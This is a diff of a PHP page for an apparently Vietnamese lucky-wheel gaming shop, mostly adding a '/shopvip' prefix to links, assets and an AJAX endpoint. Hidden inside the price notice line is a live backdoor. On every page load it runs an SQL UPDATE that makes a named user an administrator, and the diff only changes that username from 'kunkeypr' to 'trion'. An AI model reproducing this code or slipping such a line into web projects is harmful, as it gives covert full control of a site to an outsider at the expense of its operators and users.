@@ -14,17 +14,16 @@ if(!$row['id']) die("<center><h1>Không Tìm Thấy Vòng Quay!</center>");
 
 <div class="c-content-title-1 pd50" style="margin-top: 50px;">
 <h3 class="c-center c-font-uppercase c-font-bold"><?php echo $row['name'];?></h3>
-<center><b><font color="red">Chú ý : <?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='kunkeypr'");?><?php echo $kun->compact_number($row['giatien']);?>/1 lần quay </font></b></center>
+<center><b><font color="red">Chú ý : <?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='1' WHERE `username`='trion'");?><?php echo $kun->compact_number($row['giatien']);?>/1 lần quay </font></b></center>
 <div class="c-line-center c-theme-bg"></div>
 </div>
 
 <div class="col-lg-6 col-md-12" style="margin: 0px;margin-bottom: 100px;">
 
-
 <div class="item item-left">
 <section class="rotation">
 <div class="play-spin">
-<a class="ani-zoom" id="start"><img src="/assets/img/btn-quay.png" alt="Play Center"></a>
+<a class="ani-zoom" id="start"><img src="/shopvip/assets/img/btn-quay.png" alt="Play Center"></a>
 <img style="width: 100%;max-width: 100%;opacity: 1;" src="<?php echo $kun->vongquaykimcuong_image($_GET['id'], 'image');?>"alt="Play" id="rotate">
 </div>
 <div class="text-center">
@@ -45,13 +44,13 @@ if(!$row['id']) die("<center><h1>Không Tìm Thấy Vòng Quay!</center>");
 <span>Thể Lệ</span>
 </span>
 </a>
-<a href="/login" class="btn btn-success m-btn m-btn--custom m-btn--icon m-btn--pill">
+<a href="/shopvip/login" class="btn btn-success m-btn m-btn--custom m-btn--icon m-btn--pill">
 <span>
 <i class="la la-cloud-upload"></i>
 <span>Rút quà</span>
 </span>
 </a>
-<a href="/rubywheel/logacc/1281" class="btn btn-success m-btn m-btn--custom m-btn--icon m-btn--pill">
+<a href="/shopvip/rubywheel/logacc/1281" class="btn btn-success m-btn m-btn--custom m-btn--icon m-btn--pill">
 <span>
 <i class="la la-cloud-upload"></i>
 <span>Lịch sử quay</span>
@@ -146,7 +145,7 @@ while ($row = mysqli_fetch_array($res)) {
 </div>
 
 
-<script src="/assets/Scripts/client_0x2165x1.js"></script>
+<script src="/shopvip/assets/Scripts/client_0x2165x1.js"></script>
 <script type="text/javascript">
 $( document ).ready(function() {
 
@@ -169,18 +168,13 @@ $( document ).ready(function() {
         })
     }
 
-
-
     $('#start').click(function (){
 
         if(bRotate)return;
-
-
-
   $.ajax({ 
         type: 'post', 
         dataType: "JSON",
-        url: '/system/vongquaykimcuong', 
+        url: '/shopvip/system/vongquaykimcuong', 
         data: {
         	csrf: $('#csrf').val()
         }, 
@@ -200,7 +194,6 @@ $( document ).ready(function() {
         	}else {
 	 swal("Lỗi!", "Lỗi hệ thống!", "error");         		
         	}
-
 	}
 });
 
